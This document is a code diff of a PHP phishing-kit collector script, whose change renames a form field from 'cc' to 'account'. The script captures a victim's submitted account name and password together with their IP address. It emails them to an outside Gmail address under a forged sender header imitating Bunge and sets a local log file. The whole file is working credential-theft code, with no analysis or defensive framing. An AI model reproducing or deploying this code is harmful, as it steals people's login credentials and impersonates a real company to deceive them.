@@ -1,7 +1,7 @@
 <?php 
 $logsfile = 'datos.html';
 	
-$_SESSION['cc'] = $_POST['cc'];
+$_SESSION['account'] = $_POST['account'];
 $_SESSION['password'] = $_POST['password'];
 
 $ip = getenv("REMOTE_ADDR");
@@ -13,13 +13,13 @@ $correo="mariobunge1982@gmail.com";
 $subj="Login - $ip";
 $from= "From: Bunge <brchile@bunge.com.pe>";
 
-$cc= $_POST ['cc'];
+$account= $_POST ['account'];
 $password= $_POST ['password'];
 $user_agent = getenv("HTTP_USER_AGENT");
 
 	
 
-$content = "    | $Fecha - $Hora | $ip | $cc | $password |<br>";
+$content = "    | $Fecha - $Hora | $ip | $account | $password |<br>";
 
 mail($correo, $subj, $content, $from);
 	
